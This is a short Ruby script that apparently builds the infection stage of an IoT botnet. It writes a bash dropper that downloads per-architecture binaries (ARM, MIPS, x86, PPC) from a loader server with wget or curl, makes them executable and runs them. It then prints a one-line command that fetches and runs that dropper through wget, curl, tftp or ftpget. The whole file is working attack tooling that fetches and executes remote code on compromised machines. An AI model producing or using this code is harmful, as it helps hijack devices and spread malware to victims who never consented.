require_relative 'toml'


ARCHS = [
  'armv5.con',
  'mips.con',
  'x86_64.con',
  'armv6.con',
  'mipsel.con',
  'armv7.con',
  'armv8.con',
  'i686.con',
  'ppc.con'
]

def read_config
    config = parse_toml("./config.toml")
  config
end

def main
  config = read_config

  File.delete(config["Payload"]["ShellName"]) if File.exist?(config["Payload"]["ShellName"])
  File.open(config["Payload"]["ShellName"], "w") do |file|
    file.write("#!/bin/bash\n")
    ARCHS.each do |value|
      file.write(
        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; " \
        "wget http://#{config["LoaderServer"]}/#{value} || " \
        "curl -O http://#{config["LoaderServer"]}/#{value}; " \
        "cat #{value} > #{config["Payload"]["BinaryName"]}; " \
        "chmod +x *; " \
        "./#{config["Payload"]["BinaryName"]}\n"
      )
    end
  end


  puts "[+] #{config["Payload"]["ShellName"]} created"

  puts "\n=================== YOUR PAYLOAD. ENJOY! ===================\n"
  puts format_payload_command(config)
end

def format_payload_command(config)
  shell_name = config["Payload"]["ShellName"].split("/").last
  tftp_server = config["TftpServer"].split(":")[0]
  tftp_port = config["TftpServer"].split(":")[1]
  ftp_server = config["FtpServer"].split(":")[1]
  ftp_port = config["FtpServer"].split(":")[0]

  format(
    'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ' \
    'wget http://%s/%s || ' \
    'curl -O http://%s/%s || ' \
    'tftp %s %s -c get %s || ' \
    'ftpget -v -u %s -p %s -P %s %s %s %s; ' \
    'chmod +x %s; ' \
    'sh %s',
    config["LoaderServer"], shell_name, config["LoaderServer"], shell_name, tftp_server, tftp_port,
    shell_name, config["Payload"]["FtpLogin"], config["Payload"]["FtpPassword"],
    ftp_port, ftp_server, shell_name, shell_name, shell_name, shell_name
  )
end




main
